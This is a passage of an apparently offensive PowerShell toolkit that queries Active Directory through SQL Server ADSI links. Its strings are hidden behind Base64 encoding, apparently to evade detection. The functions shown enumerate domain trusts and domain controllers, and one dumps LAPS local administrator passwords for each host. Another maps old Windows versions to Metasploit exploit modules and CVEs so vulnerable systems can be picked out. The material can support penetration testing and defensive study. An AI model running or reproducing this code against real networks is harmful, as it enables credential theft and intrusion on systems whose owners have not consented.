        HelpMessage = 'Use adhoc connection for executing the query instead of a server link.  The link option (default) will create an ADSI server link and use OpenQuery. The AdHoc option will enable adhoc queries, and use OpenRowSet.')]
        [Switch]$UseAdHoc,
        [Parameter(Mandatory = $false,
        HelpMessage = 'Suppress verbose errors.  Used when function is wrapped.')]
        [switch]$SuppressVerbose
    )
    Begin
    {
        if(-not $Instance)
        {
            $Instance = $env:COMPUTERNAME
        }
        $TblTrusts = New-Object System.Data.DataTable
        $TblTrusts.Columns.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VAByAHUAcwB0AGUAZABEAG8AbQBhAGkAbgA=')))) | Out-Null
        $TblTrusts.Columns.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VAByAHUAcwB0AGUAZABEAG8AbQBhAGkAbgBEAG4A')))) | Out-Null
        $TblTrusts.Columns.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VAByAHUAcwB0AHQAeQBwAGUA')))) | Out-Null
        $TblTrusts.Columns.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VAByAHUAcwB0AGQAaQByAGUAYwB0AGkAbwBuAA==')))) | Out-Null
        $TblTrusts.Columns.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VAByAHUAcwB0AGEAdAB0AHIAaQBiAHUAdABlAHMA')))) | Out-Null
        $TblTrusts.Columns.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VwBoAGUAbgBjAHIAZQBhAHQAZQBkAA==')))) | Out-Null
        $TblTrusts.Columns.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VwBoAGUAbgBjAGgAYQBuAGcAZQBkAA==')))) | Out-Null
        $TblTrusts.Columns.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TwBiAGoAZQBjAHQAYwBsAGEAcwBzAA==')))) | Out-Null
        $TblTrusts.Clear()
    }
    Process
    {
        if($UseAdHoc){
            $Result = Get-SQLDomainObject -Verbose -Instance $Instance -Username $Username -Password $Password -LinkUsername $LinkUsername -LinkPassword $LinkPassword -LdapFilter $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('KABvAGIAagBlAGMAdABDAGwAYQBzAHMAPQB0AHIAdQBzAHQAZQBkAEQAbwBtAGEAaQBuACkA'))) -LdapFields $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('dAByAHUAcwB0AHAAYQByAHQAbgBlAHIALABkAGkAcwB0AGkAbgBnAHUAaQBzAGgAZQBkAG4AYQBtAGUALAB0AHIAdQBzAHQAdAB5AHAAZQAsAHQAcgB1AHMAdABkAGkAcgBlAGMAdABpAG8AbgAsAHQAcgB1AHMAdABhAHQAdAByAGkAYgB1AHQAZQBzACwAdwBoAGUAbgBjAHIAZQBhAHQAZQBkACwAdwBoAGUAbgBjAGgAYQBuAGcAZQBkACwAYQBkAHMAcABhAHQAaAA='))) -UseAdHoc            
        }else{
            $Result = Get-SQLDomainObject -Verbose -Instance $Instance -Username $Username -Password $Password -LinkUsername $LinkUsername -LinkPassword $LinkPassword -LdapFilter $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('KABvAGIAagBlAGMAdABDAGwAYQBzAHMAPQB0AHIAdQBzAHQAZQBkAEQAbwBtAGEAaQBuACkA'))) -LdapFields $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('dAByAHUAcwB0AHAAYQByAHQAbgBlAHIALABkAGkAcwB0AGkAbgBnAHUAaQBzAGgAZQBkAG4AYQBtAGUALAB0AHIAdQBzAHQAdAB5AHAAZQAsAHQAcgB1AHMAdABkAGkAcgBlAGMAdABpAG8AbgAsAHQAcgB1AHMAdABhAHQAdAByAGkAYgB1AHQAZQBzACwAdwBoAGUAbgBjAHIAZQBhAHQAZQBkACwAdwBoAGUAbgBjAGgAYQBuAGcAZQBkACwAYQBkAHMAcABhAHQAaAA=')))            
        }
        $Result | % {
            $TrustDirection = Switch ($_.trustdirection) {
                0 { $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RABpAHMAYQBiAGwAZQBkAA=='))) }
                1 { $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('SQBuAGIAbwB1AG4AZAA='))) }
                2 { $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TwB1AHQAYgBvAHUAbgBkAA=='))) }
                3 { $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QgBpAGQAaQByAGUAYwB0AGkAbwBuAGEAbAA='))) }
            }
            $TrustAttrib = Switch ($_.trustattributes){
                0x001 { $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('bgBvAG4AXwB0AHIAYQBuAHMAaQB0AGkAdgBlAA=='))) }
                0x002 { $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('dQBwAGwAZQB2AGUAbABfAG8AbgBsAHkA'))) }
                0x004 { $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('cQB1AGEAcgBhAG4AdABpAG4AZQBkAF8AZABvAG0AYQBpAG4A'))) }
                0x008 { $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('ZgBvAHIAZQBzAHQAXwB0AHIAYQBuAHMAaQB0AGkAdgBlAA=='))) }
                0x010 { $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('YwByAG8AcwBzAF8AbwByAGcAYQBuAGkAegBhAHQAaQBvAG4A'))) }
                0x020 { $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('dwBpAHQAaABpAG4AXwBmAG8AcgBlAHMAdAA='))) }
                0x040 { $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('dAByAGUAYQB0AF8AYQBzAF8AZQB4AHQAZQByAG4AYQBsAA=='))) }
                0x080 { $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('dAByAHUAcwB0AF8AdQBzAGUAcwBfAHIAYwA0AF8AZQBuAGMAcgB5AHAAdABpAG8AbgA='))) }
                0x100 { $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('dAByAHUAcwB0AF8AdQBzAGUAcwBfAGEAZQBzAF8AawBlAHkAcwA='))) }
                Default {                 
                    $_.trustattributes
                }
            }
            $TrustType = Switch ($_.trusttype){
                1 {$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RABvAHcAbgBsAGUAdgBlAGwAIABUAHIAdQBzAHQAIAAoAFcAaQBuAGQAbwB3AHMAIABOAFQAIABkAG8AbQBhAGkAbgAgAGUAeAB0AGUAcgBuAGEAbAApAA==')))}
                2 {$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VQBwAGwAZQB2AGUAbAAgAFQAcgB1AHMAdAAgACgAQQBjAHQAaQB2AGUAIABEAGkAcgBlAGMAdABvAHIAeQAgAGQAbwBtAGEAaQBuACAALQAgAHAAYQByAGUAbgB0AC0AYwBoAGkAbABkACwAIAByAG8AbwB0ACAAZABvAG0AYQBpAG4ALAAgAHMAaABvAHIAdABjAHUAdAAsACAAZQB4AHQAZQByAG4AYQBsACwAIABvAHIAIABmAG8AcgBlAHMAdAApAA==')))}
                3 {$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TQBJAFQAIAAoAG4AbwBuAC0AVwBpAG4AZABvAHcAcwAgAEsAZQByAGIAZQByAG8AcwAgAHYAZQByAHMAaQBvAG4AIAA1ACAAcgBlAGEAbABtACkA')))}
                4 {$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RABDAEUAIAAoAFQAaABlAG8AcgBlAHQAaQBjAGEAbAAgAHQAcgB1AHMAdAAgAHQAeQBwAGUAIAAtACAARABDAEUAIAByAGUAZgBlAHIAcwAgAHQAbwAgAE8AcABlAG4AIABHAHIAbwB1AHAAJwBzACAARABpAHMAdAByAGkAYgB1AHQAZQBkACAAQwBvAG0AcAB1AHQAaQBuAGcAKQA=')))}
            }
            $TblTrusts.Rows.Add(
                [string]$_.trustpartner,
                [string]$_.distinguishedname,
                [string]$TrustType,
                [string]$TrustDirection,
                [string]$TrustAttrib,
                [string]$_.whencreated,
                [string]$_.whenchanged,
                [string]$_.objectclass
            ) | Out-Null
        }
        $TblTrusts
    }
    End
    {               
    }
}
Function  Get-SQLDomainPasswordsLAPS
{
    [CmdletBinding()]
    Param(
        [Parameter(Mandatory = $false,
        HelpMessage = 'SQL Server or domain account to authenticate to SQL Server.')]
        [string]$Username,
        [Parameter(Mandatory = $false,
        HelpMessage = 'SQL Server or domain account password to authenticate to SQL Server.')]
        [string]$Password,
        [Parameter(Mandatory = $false,
        HelpMessage = 'Domain account used to authenticate to LDAP through SQL Server ADSI link.')]
        [string]$LinkUsername,
        [Parameter(Mandatory = $false,
        HelpMessage = 'Domain account password used to authenticate to LDAP through SQL Server ADSI link.')]
        [string]$LinkPassword,
        [Parameter(Mandatory = $false,
        HelpMessage = 'Windows credentials.')]
        [System.Management.Automation.PSCredential]
        [System.Management.Automation.Credential()]$Credential = [System.Management.Automation.PSCredential]::Empty,
        [Parameter(Mandatory = $false,
                ValueFromPipelineByPropertyName = $true,
        HelpMessage = 'SQL Server instance to connection to.')]
        [string]$Instance,
        [Parameter(Mandatory = $false,
        HelpMessage = 'Use adhoc connection for executing the query instead of a server link.  The link option (default) will create an ADSI server link and use OpenQuery. The AdHoc option will enable adhoc queries, and use OpenRowSet.')]
        [Switch]$UseAdHoc,
        [Parameter(Mandatory = $false,
        HelpMessage = 'Suppress verbose errors.  Used when function is wrapped.')]
        [switch]$SuppressVerbose
    )
    Begin
    {
        if(-not $Instance)
        {
            $Instance = $env:COMPUTERNAME
        }
        $TableLAPS = New-Object System.Data.DataTable 
        $TableLAPS.Columns.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('SABvAHMAdABuAGEAbQBlAA==')))) | Out-Null
        $TableLAPS.Columns.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UABhAHMAcwB3AG8AcgBkAA==')))) | Out-Null
        $TableLAPS.Clear()
    }
    Process
    {
        if($UseAdHoc){
            $Result = Get-SQLDomainObject -Verbose -Instance $Instance -Username $Username -Password $Password -LinkUsername $LinkUsername -LinkPassword $LinkPassword -LdapFilter $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('KABvAGIAagBlAGMAdABDAGEAdABlAGcAbwByAHkAPQBDAG8AbQBwAHUAdABlAHIAKQA='))) -LdapFields $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('ZABuAHMAaABvAHMAdABuAGEAbQBlACwAbQBzAC0ATQBDAFMALQBBAGQAbQBQAHcAZAAsAGEAZABzAHAAYQB0AGgA'))) -UseAdHoc            
        }else{
            $Result = Get-SQLDomainObject -Verbose -Instance $Instance -Username $Username -Password $Password -LinkUsername $LinkUsername -LinkPassword $LinkPassword -LdapFilter $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('KABvAGIAagBlAGMAdABDAGEAdABlAGcAbwByAHkAPQBDAG8AbQBwAHUAdABlAHIAKQA='))) -LdapFields $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('ZABuAHMAaABvAHMAdABuAGEAbQBlACwAbQBzAC0ATQBDAFMALQBBAGQAbQBQAHcAZAAsAGEAZABzAHAAYQB0AGgA')))            
        }
        $Result | % {
            $CurrentHost = $_.dnshostname
            $CurrentPassword = $_.'ms-MCS-AdmPwd'
            if ([string]$CurrentPassword)
            {
                $TableLAPS.Rows.Add($CurrentHost,$CurrentPassword) | Out-Null
            }
        }
        $TableLAPS
    }
    End
    {               
    }
}
Function  Get-SQLDomainController
{
    [CmdletBinding()]
    Param(
        [Parameter(Mandatory = $false,
        HelpMessage = 'SQL Server or domain account to authenticate to SQL Server.')]
        [string]$Username,
        [Parameter(Mandatory = $false,
        HelpMessage = 'SQL Server or domain account password to authenticate to SQL Server.')]
        [string]$Password,
        [Parameter(Mandatory = $false,
        HelpMessage = 'Domain account used to authenticate to LDAP through SQL Server ADSI link.')]
        [string]$LinkUsername,
        [Parameter(Mandatory = $false,
        HelpMessage = 'Domain account password used to authenticate to LDAP through SQL Server ADSI link.')]
        [string]$LinkPassword,
        [Parameter(Mandatory = $false,
        HelpMessage = 'Windows credentials.')]
        [System.Management.Automation.PSCredential]
        [System.Management.Automation.Credential()]$Credential = [System.Management.Automation.PSCredential]::Empty,
        [Parameter(Mandatory = $false,
                ValueFromPipelineByPropertyName = $true,
        HelpMessage = 'SQL Server instance to connection to.')]
        [string]$Instance,
        [Parameter(Mandatory = $false,
        HelpMessage = 'Use adhoc connection for executing the query instead of a server link.  The link option (default) will create an ADSI server link and use OpenQuery. The AdHoc option will enable adhoc queries, and use OpenRowSet.')]
        [Switch]$UseAdHoc,
        [Parameter(Mandatory = $false,
        HelpMessage = 'Suppress verbose errors.  Used when function is wrapped.')]
        [switch]$SuppressVerbose
    )
    Begin
    {
        if(-not $Instance)
        {
            $Instance = $env:COMPUTERNAME
        }
    }
    Process
    {
        if($UseAdHoc){
            Get-SQLDomainObject -Verbose -Instance $Instance -Username $Username -Password $Password -LinkUsername $LinkUsername -LinkPassword $LinkPassword -LdapFilter $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('KAAmACgAbwBiAGoAZQBjAHQAQwBhAHQAZQBnAG8AcgB5AD0AYwBvAG0AcAB1AHQAZQByACkAKAB1AHMAZQByAEEAYwBjAG8AdQBuAHQAQwBvAG4AdAByAG8AbAA6ADEALgAyAC4AOAA0ADAALgAxADEAMwA1ADUANgAuADEALgA0AC4AOAAwADMAOgA9ADgAMQA5ADIAKQApAA=='))) -LdapFields $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('bgBhAG0AZQAsAGQAbgBzAGgAbwBzAHQAbgBhAG0AZQAsAG8AcABlAHIAYQB0AGkAbgBnAHMAeQBzAHQAZQBtACwAbwBwAGUAcgBhAHQAaQBuAGcAcwB5AHMAdABlAG0AdgBlAHIAcwBpAG8AbgAsAG8AcABlAHIAYQB0AGkAbgBnAHMAeQBzAHQAZQBtAHMAZQByAHYAaQBjAGUAcABhAGMAawAsAHcAaABlAG4AYwBoAGEAbgBnAGUAZAAsAGwAbwBnAG8AbgBjAG8AdQBuAHQA'))) -UseAdHoc            
        }else{
            Get-SQLDomainObject -Verbose -Instance $Instance -Username $Username -Password $Password -LinkUsername $LinkUsername -LinkPassword $LinkPassword -LdapFilter $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('KAAmACgAbwBiAGoAZQBjAHQAQwBhAHQAZQBnAG8AcgB5AD0AYwBvAG0AcAB1AHQAZQByACkAKAB1AHMAZQByAEEAYwBjAG8AdQBuAHQAQwBvAG4AdAByAG8AbAA6ADEALgAyAC4AOAA0ADAALgAxADEAMwA1ADUANgAuADEALgA0AC4AOAAwADMAOgA9ADgAMQA5ADIAKQApAA=='))) -LdapFields $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('bgBhAG0AZQAsAGQAbgBzAGgAbwBzAHQAbgBhAG0AZQAsAG8AcABlAHIAYQB0AGkAbgBnAHMAeQBzAHQAZQBtACwAbwBwAGUAcgBhAHQAaQBuAGcAcwB5AHMAdABlAG0AdgBlAHIAcwBpAG8AbgAsAG8AcABlAHIAYQB0AGkAbgBnAHMAeQBzAHQAZQBtAHMAZQByAHYAaQBjAGUAcABhAGMAawAsAHcAaABlAG4AYwBoAGEAbgBnAGUAZAAsAGwAbwBnAG8AbgBjAG8AdQBuAHQA')))            
        }
    }
    End
    {               
    }
}
Function  Get-SQLDomainExploitableSystem
{
    [CmdletBinding()]
    Param(
        [Parameter(Mandatory = $false,
        HelpMessage = 'SQL Server or domain account to authenticate to SQL Server.')]
        [string]$Username,
        [Parameter(Mandatory = $false,
        HelpMessage = 'SQL Server or domain account password to authenticate to SQL Server.')]
        [string]$Password,
        [Parameter(Mandatory = $false,
        HelpMessage = 'Domain account used to authenticate to LDAP through SQL Server ADSI link.')]
        [string]$LinkUsername,
        [Parameter(Mandatory = $false,
        HelpMessage = 'Domain account password used to authenticate to LDAP through SQL Server ADSI link.')]
        [string]$LinkPassword,
        [Parameter(Mandatory = $false,
        HelpMessage = 'Windows credentials.')]
        [System.Management.Automation.PSCredential]
        [System.Management.Automation.Credential()]$Credential = [System.Management.Automation.PSCredential]::Empty,
        [Parameter(Mandatory = $false,
                ValueFromPipelineByPropertyName = $true,
        HelpMessage = 'SQL Server instance to connection to.')]
        [string]$Instance,
        [Parameter(Mandatory = $false,
        HelpMessage = 'Use adhoc connection for executing the query instead of a server link.  The link option (default) will create an ADSI server link and use OpenQuery. The AdHoc option will enable adhoc queries, and use OpenRowSet.')]
        [Switch]$UseAdHoc,
        [Parameter(Mandatory = $false,
        HelpMessage = 'Suppress verbose errors.  Used when function is wrapped.')]
        [switch]$SuppressVerbose
    )
    Begin
    {
        if(-not $Instance)
        {
            $Instance = $env:COMPUTERNAME
        }
        $TableExploits = New-Object System.Data.DataTable 
        $TableExploits.Columns.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TwBwAGUAcgBhAHQAaQBuAGcAUwB5AHMAdABlAG0A')))) | Out-Null 
        $TableExploits.Columns.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAHIAdgBpAGMAZQBQAGEAYwBrAA==')))) | Out-Null
        $TableExploits.Columns.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TQBzAGYATQBvAGQAdQBsAGUA')))) | Out-Null  
        $TableExploits.Columns.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwBWAEUA')))) | Out-Null
        $TableExploits.Rows.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VwBpAG4AZABvAHcAcwAgADcA'))),"",$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('ZQB4AHAAbABvAGkAdAAvAHcAaQBuAGQAbwB3AHMALwBzAG0AYgAvAG0AcwAxADAAXwAwADYAMQBfAHMAcABvAG8AbABzAHMA'))),$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('aAB0AHQAcAA6AC8ALwB3AHcAdwAuAGMAdgBlAGQAZQB0AGEAaQBsAHMALgBjAG8AbQAvAGMAdgBlAC8AMgAwADEAMAAtADIANwAyADkA')))) | Out-Null  
        $TableExploits.Rows.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VwBpAG4AZABvAHcAcwAgAFMAZQByAHYAZQByACAAMgAwADAAMAA='))),$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAHIAdgBlAHIAIABQAGEAYwBrACAAMQA='))),$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('ZQB4AHAAbABvAGkAdAAvAHcAaQBuAGQAbwB3AHMALwBkAGMAZQByAHAAYwAvAG0AcwAwADMAXwAwADIANgBfAGQAYwBvAG0A'))),$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('aAB0AHQAcAA6AC8ALwB3AHcAdwAuAGMAdgBlAGQAZQB0AGEAaQBsAHMALgBjAG8AbQAvAGMAdgBlAC8AMgAwADAAMwAtADAAMwA1ADIALwA=')))) | Out-Null  
        $TableExploits.Rows.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VwBpAG4AZABvAHcAcwAgAFMAZQByAHYAZQByACAAMgAwADAAMAA='))),$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAHIAdgBlAHIAIABQAGEAYwBrACAAMQA='))),$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('ZQB4AHAAbABvAGkAdAAvAHcAaQBuAGQAbwB3AHMALwBkAGMAZQByAHAAYwAvAG0AcwAwADUAXwAwADEANwBfAG0AcwBtAHEA'))),$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('aAB0AHQAcAA6AC8ALwB3AHcAdwAuAGMAdgBlAGQAZQB0AGEAaQBsAHMALgBjAG8AbQAvAGMAdgBlAC8AMgAwADAANQAtADAAMAA1ADkA')))) | Out-Null  
        $TableExploits.Rows.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VwBpAG4AZABvAHcAcwAgAFMAZQByAHYAZQByACAAMgAwADAAMAA='))),$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAHIAdgBlAHIAIABQAGEAYwBrACAAMQA='))),$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('ZQB4AHAAbABvAGkAdAAvAHcAaQBuAGQAbwB3AHMALwBpAGkAcwAvAG0AcwAwADMAXwAwADAANwBfAG4AdABkAGwAbABfAHcAZQBiAGQAYQB2AA=='))),$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('aAB0AHQAcAA6AC8ALwB3AHcAdwAuAGMAdgBlAGQAZQB0AGEAaQBsAHMALgBjAG8AbQAvAGMAdgBlAC8AMgAwADAAMwAtADAAMQAwADkA')))) | Out-Null  
        $TableExploits.Rows.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VwBpAG4AZABvAHcAcwAgAFMAZQByAHYAZQByACAAMgAwADAAMAA='))),$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAHIAdgBlAHIAIABQAGEAYwBrACAAMQA='))),$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('ZQB4AHAAbABvAGkAdAAvAHcAaQBuAGQAbwB3AHMALwB3AGkAbgBzAC8AbQBzADAANABfADAANAA1AF8AdwBpAG4AcwA='))),$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('aAB0AHQAcAA6AC8ALwB3AHcAdwAuAGMAdgBlAGQAZQB0AGEAaQBsAHMALgBjAG8AbQAvAGMAdgBlAC8AMgAwADAANAAtADEAMAA4ADAALwA=')))) | Out-Null  
        $TableExploits.Rows.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VwBpAG4AZABvAHcAcwAgAFMAZQByAHYAZQByACAAMgAwADAAMAA='))),$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAHIAdgBpAGMAZQAgAFAAYQBjAGsAIAAyAA=='))),$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('ZQB4AHAAbABvAGkAdAAvAHcAaQBuAGQAbwB3AHMALwBkAGMAZQByAHAAYwAvAG0AcwAwADMAXwAwADIANgBfAGQAYwBvAG0A'))),$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('aAB0AHQAcAA6AC8ALwB3AHcAdwAuAGMAdgBlAGQAZQB0AGEAaQBsAHMALgBjAG8AbQAvAGMAdgBlAC8AMgAwADAAMwAtADAAMwA1ADIALwA=')))) | Out-Null  
        $TableExploits.Rows.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VwBpAG4AZABvAHcAcwAgAFMAZQByAHYAZQByACAAMgAwADAAMAA='))),$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAHIAdgBpAGMAZQAgAFAAYQBjAGsAIAAyAA=='))),$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('ZQB4AHAAbABvAGkAdAAvAHcAaQBuAGQAbwB3AHMALwBkAGMAZQByAHAAYwAvAG0AcwAwADUAXwAwADEANwBfAG0AcwBtAHEA'))),$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('aAB0AHQAcAA6AC8ALwB3AHcAdwAuAGMAdgBlAGQAZQB0AGEAaQBsAHMALgBjAG8AbQAvAGMAdgBlAC8AMgAwADAANQAtADAAMAA1ADkA')))) | Out-Null  
        $TableExploits.Rows.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VwBpAG4AZABvAHcAcwAgAFMAZQByAHYAZQByACAAMgAwADAAMAA='))),$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAHIAdgBpAGMAZQAgAFAAYQBjAGsAIAAyAA=='))),$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('ZQB4AHAAbABvAGkAdAAvAHcAaQBuAGQAbwB3AHMALwBpAGkAcwAvAG0AcwAwADMAXwAwADAANwBfAG4AdABkAGwAbABfAHcAZQBiAGQAYQB2AA=='))),$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('aAB0AHQAcAA6AC8ALwB3AHcAdwAuAGMAdgBlAGQAZQB0AGEAaQBsAHMALgBjAG8AbQAvAGMAdgBlAC8AMgAwADAAMwAtADAAMQAwADkA')))) | Out-Null  
        $TableExploits.Rows.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VwBpAG4AZABvAHcAcwAgAFMAZQByAHYAZQByACAAMgAwADAAMAA='))),$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAHIAdgBpAGMAZQAgAFAAYQBjAGsAIAAyAA=='))),$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('ZQB4AHAAbABvAGkAdAAvAHcAaQBuAGQAbwB3AHMALwBzAG0AYgAvAG0AcwAwADQAXwAwADEAMQBfAGwAcwBhAHMAcwA='))),$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('aAB0AHQAcAA6AC8ALwB3AHcAdwAuAGMAdgBlAGQAZQB0AGEAaQBsAHMALgBjAG8AbQAvAGMAdgBlAC8AMgAwADAAMwAtADAANQAzADMALwA=')))) | Out-Null  
        $TableExploits.Rows.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VwBpAG4AZABvAHcAcwAgAFMAZQByAHYAZQByACAAMgAwADAAMAA='))),$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAHIAdgBpAGMAZQAgAFAAYQBjAGsAIAAyAA=='))),$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('ZQB4AHAAbABvAGkAdAAvAHcAaQBuAGQAbwB3AHMALwB3AGkAbgBzAC8AbQBzADAANABfADAANAA1AF8AdwBpAG4AcwA='))),$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('aAB0AHQAcAA6AC8ALwB3AHcAdwAuAGMAdgBlAGQAZQB0AGEAaQBsAHMALgBjAG8AbQAvAGMAdgBlAC8AMgAwADAANAAtADEAMAA4ADAALwA=')))) | Out-Null  
        $TableExploits.Rows.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VwBpAG4AZABvAHcAcwAgAFMAZQByAHYAZQByACAAMgAwADAAMAA='))),$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAHIAdgBpAGMAZQAgAFAAYQBjAGsAIAAzAA=='))),$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('ZQB4AHAAbABvAGkAdAAvAHcAaQBuAGQAbwB3AHMALwBkAGMAZQByAHAAYwAvAG0AcwAwADMAXwAwADIANgBfAGQAYwBvAG0A'))),$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('aAB0AHQAcAA6AC8ALwB3AHcAdwAuAGMAdgBlAGQAZQB0AGEAaQBsAHMALgBjAG8AbQAvAGMAdgBlAC8AMgAwADAAMwAtADAAMwA1ADIALwA=')))) | Out-Null  
        $TableExploits.Rows.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VwBpAG4AZABvAHcAcwAgAFMAZQByAHYAZQByACAAMgAwADAAMAA='))),$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAHIAdgBpAGMAZQAgAFAAYQBjAGsAIAAzAA=='))),$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('ZQB4AHAAbABvAGkAdAAvAHcAaQBuAGQAbwB3AHMALwBkAGMAZQByAHAAYwAvAG0AcwAwADUAXwAwADEANwBfAG0AcwBtAHEA'))),$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('aAB0AHQAcAA6AC8ALwB3AHcAdwAuAGMAdgBlAGQAZQB0AGEAaQBsAHMALgBjAG8AbQAvAGMAdgBlAC8AMgAwADAANQAtADAAMAA1ADkA')))) | Out-Null  
        $TableExploits.Rows.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VwBpAG4AZABvAHcAcwAgAFMAZQByAHYAZQByACAAMgAwADAAMAA='))),$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAHIAdgBpAGMAZQAgAFAAYQBjAGsAIAAzAA=='))),$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('ZQB4AHAAbABvAGkAdAAvAHcAaQBuAGQAbwB3AHMALwBpAGkAcwAvAG0AcwAwADMAXwAwADAANwBfAG4AdABkAGwAbABfAHcAZQBiAGQAYQB2AA=='))),$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('aAB0AHQAcAA6AC8ALwB3AHcAdwAuAGMAdgBlAGQAZQB0AGEAaQBsAHMALgBjAG8AbQAvAGMAdgBlAC8AMgAwADAAMwAtADAAMQAwADkA')))) | Out-Null  
        $TableExploits.Rows.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VwBpAG4AZABvAHcAcwAgAFMAZQByAHYAZQByACAAMgAwADAAMAA='))),$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAHIAdgBpAGMAZQAgAFAAYQBjAGsAIAAzAA=='))),$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('ZQB4AHAAbABvAGkAdAAvAHcAaQBuAGQAbwB3AHMALwB3AGkAbgBzAC8AbQBzADAANABfADAANAA1AF8AdwBpAG4AcwA='))),$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('aAB0AHQAcAA6AC8ALwB3AHcAdwAuAGMAdgBlAGQAZQB0AGEAaQBsAHMALgBjAG8AbQAvAGMAdgBlAC8AMgAwADAANAAtADEAMAA4ADAALwA=')))) | Out-Null  
